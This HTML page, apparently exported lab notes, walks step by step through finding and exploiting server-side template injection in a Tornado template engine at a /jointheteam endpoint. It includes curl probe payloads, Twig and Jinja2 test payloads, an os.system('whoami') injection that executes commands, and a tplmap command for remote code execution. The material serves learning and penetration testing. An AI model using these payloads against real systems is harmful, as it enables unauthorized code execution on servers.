<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SSTI Tornado Template Engine</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SSTI Tornado Template Engine</h1><br/><br /><br />    <a href=""><img src="images/2579-1.png" alt="images/2579-1.png" /></a><br /><br />1. Send some test characters to check the response<br />    <a href=""><img src="images/2579-2.png" alt="images/2579-2.png" /></a><br /><br />2. As the diagram of PortsWigger suggest, try some payloads: <a href="https://portswigger.net/research/server-side-template-injection">PortsSwigger</a> <br /><a href=""><img src="images/2579-3.png" alt="images/2579-3.png" /></a><br /><br />3. Test some general payloads:<br />    <div class="codebox"><pre>curl -X POST -d &#39;email=${7*7}&#39; http://<span style="color:#7f0044;font-weight:400">&lt;TARGET</span> <span style="color:#333333;font-weight:400">IP</span><span style="color:#7f0044;font-weight:400">&gt;</span>:<span style="color:#7f0044;font-weight:400">&lt;PORT&gt;</span>/jointheteam</pre></div><br />    <a href=""><img src="images/2579-4.png" alt="images/2579-4.png" /></a><br />    <div class="codebox"><pre>curl -X POST -d &#39;email={{7*7}}&#39; http://<span style="color:#7f0044;font-weight:400">&lt;TARGET</span> <span style="color:#333333;font-weight:400">IP</span><span style="color:#7f0044;font-weight:400">&gt;</span>:<span style="color:#7f0044;font-weight:400">&lt;PORT&gt;</span>/jointheteam</pre></div><br />    <a href=""><img src="images/2579-5.png" alt="images/2579-5.png" /></a><br />    So, according to the diagram, we should be dealing with a Twig or Jinja2 template engine.... <br />    <strong>BUT WE WILL SEE THAT IS NOT LIKE THAT</strong><br /><br />4. Try some specific payloads for Twig or Jinja2<br />   ◇ Twig<br />      <div class="codebox"><pre>{{constant(&#39;Twig_Environment::VERSION&#39;)}}<br />{{_self.env.display(&quot;TEST&quot;)}}</pre></div><br />      <a href=""><img src="images/2579-6.png" alt="images/2579-6.png" /></a><br />      <a href=""><img src="images/2579-7.png" alt="images/2579-7.png" /></a><br />   ◇ Jinja2<br />      <div class="codebox"><pre>{{config.items()}}<br />{{ [].class.base.subclasses() }}</pre></div><br />        <a href=""><img src="images/2579-8.png" alt="images/2579-8.png" /></a><br />        <a href=""><img src="images/2579-9.png" alt="images/2579-9.png" /></a><br /> <br />5. <h3> </h3>No methodology is bulletproof. <br />    The WebApplication (we have seen from point 3 is vulnerable), now we need to find the Template Engine Used<br />   ◇ Tordado <br />      <div class="codebox"><pre>{% import foobar %}    ---&gt; Error<br />{% import os %}        ---&gt; Processed but no output<br />{% import os %}{{os.system(&#39;whoami&#39;)}}   ---&gt; Processed with output 0</pre></div><br />      <a href=""><img src="images/2579-10.png" alt="images/2579-10.png" /></a><br />      <a href=""><img src="images/2579-11.png" alt="images/2579-11.png" /></a><br />      <a href=""><img src="images/2579-12.png" alt="images/2579-12.png" /></a><br />      Vulnerable<br /><br />6. RCE on Tornado Template Engine<br />    <div class="codebox"><pre>./tplmap.py -u &#39;http://<span style="color:#7f0044;font-weight:400">&lt;TARGET</span> <span style="color:#333333;font-weight:400">IP</span><span style="color:#7f0044;font-weight:400">&gt;</span>:<span style="color:#7f0044;font-weight:400">&lt;PORT&gt;</span>/jointheteam&#39; -d email=blah</pre></div><br />    <a href=""><img src="images/2579-13.png" alt="images/2579-13.png" /></a></div>
</body>
</html>
